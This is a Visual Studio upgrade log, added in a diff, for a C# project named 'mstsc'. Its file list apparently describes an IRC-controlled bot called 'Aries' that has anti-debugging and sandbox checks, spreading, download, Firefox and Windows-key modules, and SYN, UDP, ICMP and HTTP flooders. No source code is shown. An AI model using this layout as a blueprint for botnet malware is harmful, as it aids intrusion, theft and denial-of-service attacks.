@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet type='text/xsl' href='_UpgradeReport_Files/UpgradeReport.xslt'?><UpgradeLog>
+<Properties><Property Name="Solution" Value="mstsc">
+</Property><Property Name="Solution File" Value="C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\mstsc.sln">
+</Property><Property Name="User Options File" Value="C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\mstsc.suo">
+</Property><Property Name="Date" Value="Tuesday, January 04, 2011">
+</Property><Property Name="Time" Value="15:54 PM">
+</Property></Properties><Event ErrorLevel="0" Project="" Source="mstsc.sln" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\mstsc.sln">
+</Event><Event ErrorLevel="0" Project="" Source="mstsc.suo" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\mstsc.suo">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="mstsc.csproj" Description="Project file successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\mstsc.csproj">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="mstsc.csproj.user" Description="Project user file successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\mstsc.csproj.user">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\AntiFound.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\AntiFound.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\CheckDebugger.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\CheckDebugger.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\CheckProcess.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\CheckProcess.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\Config.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\Config.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\ProcessAntis.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\ProcessAntis.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\Sandbox.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\Sandbox.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\Sniffers.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\Sniffers.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\SysInternals.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\SysInternals.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Antis\Virtualized.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Antis\Virtualized.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Die.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Die.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Download.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Download.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Drives.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Drives.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Firefox.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Firefox.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Flooders\HTTP.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Flooders\HTTP.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Flooders\SYN.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Flooders\SYN.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Flooders\UDP.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Flooders\UDP.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Info.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Info.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Part.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Part.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Release.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Release.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\SpeedTest.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\SpeedTest.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Spread.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Spread.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Update.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Update.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Version.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Version.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\WindowsKey.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\WindowsKey.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Config.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Config.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\FileRegistry.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\FileRegistry.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Decompress.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Decompress.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="IRC\Sender.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\IRC\Sender.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="IRC\Client.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\IRC\Client.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="IRC\OnMessageEventArgs.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\IRC\OnMessageEventArgs.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Main.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Main.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Program.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Program.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Properties\AssemblyInfo.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Properties\AssemblyInfo.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Util.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Util.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Properties\Resources.Designer.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Properties\Resources.Designer.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="SimpleAES.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\SimpleAES.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Flooders\StopFlood.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Flooders\StopFlood.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Aries\Commands\Flooders\ICMP.cs" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Aries\Commands\Flooders\ICMP.cs">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="mstsc.snk" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\mstsc.snk">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="obj\Release\mstsc.snk" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\obj\Release\mstsc.snk">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="Properties\Resources.resx" Description="File successfully backed up as C:\Users\Admin\Documents\Visual Studio 2010\Projects\Aries\mstsc\mstsc\Backup\Properties\Resources.resx">
+</Event><Event ErrorLevel="0" Project="mstsc" Source="mstsc.csproj" Description="The project file does not require conversion.">
+</Event><Event ErrorLevel="3" Project="mstsc" Source="mstsc.csproj" Description="No Conversion Required">
+</Event><Event ErrorLevel="0" Project="" Source="mstsc.sln" Description="Solution converted successfully">
+</Event><Event ErrorLevel="3" Project="" Source="mstsc.sln" Description="Converted">
+</Event></UpgradeLog>
